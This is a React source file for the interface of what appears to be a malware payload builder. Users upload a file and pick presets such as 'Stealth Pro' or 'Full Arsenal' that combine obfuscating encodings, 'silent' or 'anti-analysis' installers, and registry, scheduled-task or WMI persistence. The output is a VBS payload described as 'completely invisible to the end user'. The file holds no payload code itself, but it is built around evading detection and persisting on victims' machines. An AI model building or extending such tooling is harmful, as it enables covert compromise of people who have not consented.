import React, { useState } from 'react';
import axios from 'axios';
import { API_BASE } from '../config';

const PRESETS = {
  stealth_pro: {
    name: 'Stealth Pro',
    icon: '🥷',
    description: 'Maximum stealth with anti-analysis and silent execution. Ideal for environments with active monitoring.',
    encoding: 'multi',
    installer: 'silent',
    persistence: 'registry',
    tags: ['Anti-Detection', 'Silent', 'Low Footprint'],
  },
  reliable_max: {
    name: 'Reliable Max',
    icon: '🛡️',
    description: 'Maximum reliability with multi-method persistence and polymorphic encoding. Best survival rate across reboots.',
    encoding: 'base64',
    installer: 'polymorphic',
    persistence: 'multi',
    tags: ['99%+ Survival', 'Polymorphic', 'Multi-Persist'],
  },
  quick_deploy: {
    name: 'Quick Deploy',
    icon: '⚡',
    description: 'Minimal footprint with fast deployment. Smallest payload size for bandwidth-constrained scenarios.',
    encoding: 'base64',
    installer: 'silent',
    persistence: 'startup',
    tags: ['Fast', 'Small Size', 'Simple'],
  },
  full_arsenal: {
    name: 'Full Arsenal',
    icon: '🔥',
    description: 'All techniques combined at maximum settings. Largest payload but highest evasion and persistence.',
    encoding: 'multi',
    installer: 'anti_analysis',
    persistence: 'multi',
    tags: ['All Techniques', 'Max Evasion', 'Max Persistence'],
  },
  silent_persistent: {
    name: 'Silent Persistent',
    icon: '👻',
    description: 'Zero visible output with robust persistence. Completely invisible to the end user.',
    encoding: 'hex',
    installer: 'multi_stage',
    persistence: 'scheduled_task',
    tags: ['Zero Output', 'Invisible', 'Scheduled'],
  },
};

const ENCODING_OPTIONS = [
  { value: 'base64', label: 'Base64' },
  { value: 'hex', label: 'Hex' },
  { value: 'multi', label: 'Multi-Encoding' },
  { value: 'direct', label: 'Direct' },
];

const INSTALLER_OPTIONS = [
  { value: 'polymorphic', label: 'Polymorphic' },
  { value: 'anti_analysis', label: 'Anti-Analysis' },
  { value: 'multi_stage', label: 'Multi-Stage' },
  { value: 'silent', label: 'Silent' },
];

const PERSISTENCE_OPTIONS = [
  { value: 'registry', label: 'Registry' },
  { value: 'startup', label: 'Startup Folder' },
  { value: 'scheduled_task', label: 'Scheduled Task' },
  { value: 'wmi', label: 'WMI Event' },
  { value: 'multi', label: 'Multi-Method' },
];

export default function CombinedMode({ uploadedFile, onGenerate }) {
  const [selectedPreset, setSelectedPreset] = useState(null);
  const [useCustom, setUseCustom] = useState(false);
  const [encoding, setEncoding] = useState('base64');
  const [installer, setInstaller] = useState('polymorphic');
  const [persistence, setPersistence] = useState('multi');
  const [generating, setGenerating] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(false);

  const handlePresetSelect = (presetKey) => {
    setSelectedPreset(presetKey);
    setUseCustom(false);
    const preset = PRESETS[presetKey];
    setEncoding(preset.encoding);
    setInstaller(preset.installer);
    setPersistence(preset.persistence);
  };

  const handleCustomToggle = () => {
    setUseCustom(true);
    setSelectedPreset(null);
  };

  const handleGenerate = async () => {
    setError(null);
    setGenerating(true);

    try {
      if (!uploadedFile) {
        setError('Please upload a file first');
        setGenerating(false);
        return;
      }

      const response = await axios.post(`${API_BASE}/generate-combined`, {
        file_id: uploadedFile.id,
        preset: selectedPreset || undefined,
        encoding,
        installer,
        persistence,
      });

      const resultData = {
        content: response.data.payload,
        size: response.data.size,
        outputId: response.data.output_id,
        stages: response.data.stages || [],
        metadata: response.data.metadata || {},
      };
      setResult(resultData);

      if (onGenerate) {
        onGenerate({
          output_id: response.data.output_id,
          payload: response.data.payload,
          size: response.data.size,
          stages: response.data.stages,
          metadata: response.data.metadata,
        });
      }
    } catch (err) {
      setError(err.response?.data?.error || 'Combined payload generation failed');
    } finally {
      setGenerating(false);
    }
  };

  const handleDownload = async () => {
    if (!result?.outputId) return;

    try {
      const response = await axios.get(`${API_BASE}/download/${result.outputId}`, {
        responseType: 'blob',
      });

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', `combined_${result.outputId}.vbs`);
      document.body.appendChild(link);
      link.click();
      link.parentElement.removeChild(link);
      window.URL.revokeObjectURL(url);
    } catch (err) {
      console.error('Download failed:', err);
    }
  };

  const handleCopy = () => {
    if (result?.content) {
      navigator.clipboard.writeText(result.content);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const activeEncoding = encoding;
  const activeInstaller = installer;
  const activePersistence = persistence;

  return (
    <div>
      <h3 style={{ color: '#00d4ff', marginBottom: '0.5rem' }}>
        Combined Deployment Pipeline
      </h3>
      <p style={{ color: '#a0a0a0', fontSize: '0.9rem', marginBottom: '1.5rem' }}>
        Select a preset combination or customize individual stages for your deployment pipeline.
      </p>

      {error && <div className="error-banner">{error}</div>}

      {/* Preset Cards */}
      <div className="form-group">
        <label>Deployment Presets</label>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.8rem' }}>
          {Object.entries(PRESETS).map(([key, preset]) => (
            <div
              key={key}
              className={`fingerprint-card ${selectedPreset === key ? 'selected' : ''}`}
              onClick={() => handlePresetSelect(key)}
              style={{ cursor: 'pointer' }}
            >
              <div className="fingerprint-name">
                {preset.icon} {preset.name}
              </div>
              <div className="fingerprint-desc" style={{ fontSize: '0.75rem', marginBottom: '0.5rem' }}>
                {preset.description}
              </div>
              <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap' }}>
                {preset.tags.map((tag) => (
                  <span
                    key={tag}
                    style={{
                      fontSize: '0.65rem',
                      padding: '0.15rem 0.4rem',
                      backgroundColor: 'rgba(0, 212, 255, 0.15)',
                      border: '1px solid rgba(0, 212, 255, 0.3)',
                      borderRadius: '3px',
                      color: '#00d4ff',
                    }}
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </div>
          ))}

          {/* Custom option card */}
          <div
            className={`fingerprint-card ${useCustom ? 'selected' : ''}`}
            onClick={handleCustomToggle}
            style={{ cursor: 'pointer' }}
          >
            <div className="fingerprint-name">
              🔧 Custom Configuration
            </div>
            <div className="fingerprint-desc" style={{ fontSize: '0.75rem' }}>
              Manually select encoding, installer, and persistence options individually.
            </div>
          </div>
        </div>
      </div>

      {/* Manual Configuration (shown when custom is selected or a preset is active for review) */}
      <div
        style={{
          marginTop: '1rem',
          padding: '1rem',
          backgroundColor: 'rgba(0, 212, 255, 0.05)',
          border: '1px solid rgba(0, 212, 255, 0.2)',
          borderRadius: '6px',
        }}
      >
        <p style={{ color: '#00d4ff', fontSize: '0.85rem', fontWeight: 600, marginBottom: '1rem' }}>
          {useCustom ? 'Custom Configuration' : selectedPreset ? `${PRESETS[selectedPreset].name} Configuration` : 'Pipeline Configuration'}
        </p>

        <div className="form-group">
          <label>Encoding Technique</label>
          <select
            value={activeEncoding}
            onChange={(e) => {
              setEncoding(e.target.value);
              if (!useCustom) {
                setUseCustom(true);
                setSelectedPreset(null);
              }
            }}
          >
            {ENCODING_OPTIONS.map((opt) => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
        </div>

        <div className="form-group">
          <label>Installer Type</label>
          <select
            value={activeInstaller}
            onChange={(e) => {
              setInstaller(e.target.value);
              if (!useCustom) {
                setUseCustom(true);
                setSelectedPreset(null);
              }
            }}
          >
            {INSTALLER_OPTIONS.map((opt) => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label>Persistence Mechanism</label>
          <select
            value={activePersistence}
            onChange={(e) => {
              setPersistence(e.target.value);
              if (!useCustom) {
                setUseCustom(true);
                setSelectedPreset(null);
              }
            }}
          >
            {PERSISTENCE_OPTIONS.map((opt) => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
        </div>
      </div>

      {/* Generate Button */}
      <button
        className="btn-primary"
        onClick={handleGenerate}
        disabled={generating || (!selectedPreset && !useCustom)}
        style={{ width: '100%', marginTop: '1.2rem' }}
      >
        {generating ? 'Generating...' : 'Generate Combined Payload'}
      </button>

      {/* Result Display */}
      {result && (
        <div style={{ marginTop: '1.5rem' }}>
          {/* Stage metadata */}
          {result.stages.length > 0 && (
            <div
              style={{
                marginBottom: '1rem',
                padding: '1rem',
                backgroundColor: 'rgba(76, 175, 80, 0.08)',
                border: '1px solid rgba(76, 175, 80, 0.3)',
                borderRadius: '6px',
              }}
            >
              <p style={{ color: '#4caf50', fontWeight: 'bold', marginBottom: '0.5rem' }}>
                Stages Applied
              </p>
              <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
                {result.stages.map((stage, idx) => (
                  <span
                    key={idx}
                    style={{
                      fontSize: '0.8rem',
                      padding: '0.3rem 0.6rem',
                      backgroundColor: 'rgba(76, 175, 80, 0.2)',
                      border: '1px solid rgba(76, 175, 80, 0.4)',
                      borderRadius: '4px',
                      color: '#4caf50',
                    }}
                  >
                    {idx + 1}. {stage}
                  </span>
                ))}
              </div>
            </div>
          )}

          {/* Metadata summary */}
          {Object.keys(result.metadata).length > 0 && (
            <div
              style={{
                display: 'grid',
                gridTemplateColumns: '1fr 1fr 1fr',
                gap: '0.8rem',
                marginBottom: '1rem',
              }}
            >
              {Object.entries(result.metadata).map(([key, value]) => (
                <div
                  key={key}
                  style={{
                    padding: '0.8rem',
                    backgroundColor: 'rgba(0, 212, 255, 0.08)',
                    border: '1px solid rgba(0, 212, 255, 0.3)',
                    borderRadius: '6px',
                  }}
                >
                  <p style={{ color: '#00d4ff', fontSize: '0.75rem', marginBottom: '0.2rem', textTransform: 'uppercase' }}>
                    {key.replace(/_/g, ' ')}
                  </p>
                  <p style={{ color: '#a0a0a0', fontWeight: 'bold', fontSize: '0.9rem' }}>
                    {String(value)}
                  </p>
                </div>
              ))}
            </div>
          )}

          {/* Size info */}
          {result.size && (
            <div
              style={{
                marginBottom: '1rem',
                padding: '0.6rem 1rem',
                backgroundColor: 'rgba(0, 212, 255, 0.08)',
                border: '1px solid rgba(0, 212, 255, 0.2)',
                borderRadius: '6px',
                fontSize: '0.85rem',
                color: '#a0a0a0',
              }}
            >
              Payload Size: <strong style={{ color: '#00d4ff' }}>{(result.size / 1024).toFixed(2)} KB</strong>
            </div>
          )}

          {/* Action buttons */}
          <div className="output-controls">
            <button className="btn-primary" onClick={handleCopy}>
              {copied ? 'Copied!' : 'Copy Payload'}
            </button>
            <button className="btn-primary" onClick={handleDownload}>
              Download
            </button>
          </div>

          {/* Code preview */}
          <p style={{ color: '#a0a0a0', fontSize: '0.85rem', marginBottom: '0.5rem' }}>
            Output Preview (First 30 lines):
          </p>
          <div className="code-preview">
            {result.content
              .split('\n')
              .slice(0, 30)
              .map((line, idx) => (
                <div key={idx}>{line || ' '}</div>
              ))}
            {result.content.split('\n').length > 30 && (
              <div style={{ color: '#666' }}>
                ... ({result.content.split('\n').length - 30} more lines)
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
